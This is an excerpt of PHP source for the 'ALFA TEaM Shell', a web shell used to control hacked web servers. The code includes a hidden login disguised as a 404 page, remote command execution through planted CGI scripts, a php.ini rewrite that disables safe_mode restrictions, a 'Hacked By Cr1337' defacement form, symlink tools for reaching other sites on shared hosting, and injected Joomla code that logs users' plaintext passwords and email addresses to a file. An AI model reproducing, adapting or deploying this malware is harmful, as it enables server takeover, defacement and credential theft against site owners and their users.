...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'root',
    'password' => '41eb01793a45a9c0827dbdca4acd61c7',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '404',
    'show_icons' => '1',
...
define("__CR1337_CODE_NAME__", "Tesla");
define("__CR1337_DATA_FOLDER__", "CR1337_DATA");
...
<title>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__CR1337_CODE_NAME__.' ~</title><center>
...
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__CR1337_CODE_NAME__.' ~</b></font></th></tr>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["cr1337cgiapi"])){
			if(!@file_exists("cr1337cgiapi/".$_COOKIE["cr1337cgiapi"].".alfa")){
				$recreate = true;
				$lang = $_COOKIE["cr1337cgiapi"];
			}
		}
		if(!isset($_COOKIE["cr1337cgiapi"])||$recreate){
			...
			alfacgihtaccess('cgi', "cr1337cgiapi/");
		}else{
			$lang = $_COOKIE["cr1337cgiapi"];
		}
		$cgi_ext = ".alfa";
		...
		$cgi_url = __CR1337_DATA_FOLDER__."/cr1337cgiapi/".$lang.$cgi_ext;
		...
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__alfa_set_cookie("cr1337cgiapi", $lang);
			}
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ ALFA TEaM Shell - v'.__ALFA_VERSION__.'-'.__CR1337_CODE_NAME__.' ::..</title>
<style type="text/css">';?>
...
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?solevisible"><span style="color:#42ff59;">'.__CR1337_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="200" height="170" alt="alfa team 2012" draggable="false" src="https://iili.io/FkJ1RvS.th.jpg" /></td>
</tr>
<tr>
...
<font color='#00A220'>Shell Coded By Cr13371337(ALFA TEaM)</font><br>
<font color='#00A220'>Contact : Cr13371337@gmail.com</font><br>
<font color='#00A220'>Telegram Channel: @@cr1337xx</font><br>
...
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["alfacgiapi_mode"])&&!isset($_COOKIE["cr1337cgiapi"])){
...
function alfaWriteTocgiapi($name, $source){
	...
	if(in_array($name, $not_api)){
		...
		@chdir($GLOBALS['home_cwd'] . "/" . __CR1337_DATA_FOLDER__);
	}
	@mkdir('cr1337cgiapi',0755);
	__write_file("cr1337cgiapi/".$name, __get_resource($source));
	@chmod("cr1337cgiapi/".$name, 0755);
	return $temp;
}
...
function alfaupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$data = alfaEx("cd '{$tmp_path}/cr1337cgiapi';sh getheader.alfa",false,true,true);
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./Cr1337 &copy; 2025-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1E47z61hurQyBuCTJeYyDZqTXUCmkytpGD\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>Cr1337[at]gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/solevisible'>@Cr1337</a></span></div></td>
</tr>
</table>
</div>
	...
	if(_alfa_can_runCommand(true,true)){
		if(_alfa_is_writable($GLOBALS['cwd'])){
			if(!_alfa_is_dir(trim($_POST['alfa2']))){
				...
				echo "<script>cr1337ShowNotification('".addslashes($_POST['alfa2'])." created...', 'Files manager');</script>";
			}else{
				echo "<script>cr1337ShowNotification('folder already existed', 'Files manager', 'error');</script>";
			}
		}else{
			echo "<script>cr1337ShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
		}
	}else{
		echo "<script>cr1337ShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
	}
}else{
	if(_alfa_is_writable($GLOBALS['cwd'])){
		if(!_alfa_is_dir(trim($_POST['alfa2']))){
...
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		...
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/cr1337cgiapi/getdir.alfa")){
		...
		$dirContent = alfaEx("cd ".$tmp_getdir_path."/cr1337cgiapi;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
<textarea name=index rows='19' cols='103'><title>Hacked By Cr1337 & 0xTeam</title><b>Hacked By Cr1337 & 0xTeam</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
...
create_table($table);
echo "<br><div class='txtfont'>| Your Index |</div><br>
<textarea name='index' rows='19' cols='103'><title>Hacked By Cr1337 & 0xTeam</title><b>Hacked By Cr1337xx & 0xTeam</b></textarea><br>
...
<title>Hacked By Cr1337 & 0xTeam</title><b>Hacked By Cr1337 & 0xTeam</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Cr1337 & 0xTeam(ALFA TEaM)");
...
function alfaCreateParentFolder(){
	$parent = $GLOBALS['home_cwd'] . "/" . __CR1337_DATA_FOLDER__;
	if(!@is_dir($parent)){
...
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__CR1337_DATA_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
...
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__CR1337_DATA_FOLDER__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
...
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__CR1337_DATA_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
...
@chmod($name,0755);
echo '<iframe src="'.__CR1337_DATA_FOLDER__.'/cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
$bash_users  = alfaEx("cd ".$tmp_path."/cr1337cgiapi;sh basedir.alfa ".$makepwd,false,true,true);
...
$code = '<?php jimport(\'joomla.user.authentication\');$Alfa_auth = & JAuthentication::getInstance();$CR1337_DATA = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$Alfa_options = array();$Alfa_response = $Alfa_auth->authenticate($CR1337_DATA, $Alfa_options);if($Alfa_response->status == 1){$alfa_file="{saveto_path}";$fp=@fopen($alfa_file,"a+");@fwrite($fp, $Alfa_response->username.":".$_POST[\'passwd\']." ( ".$Alfa_response->email." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
$code=str_replace('{saveto_path}',$saveto,$code);
...
return('<iframe src="'.__CR1337_DATA_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class AlfaCURL {
public $headers;
public $user_agent;
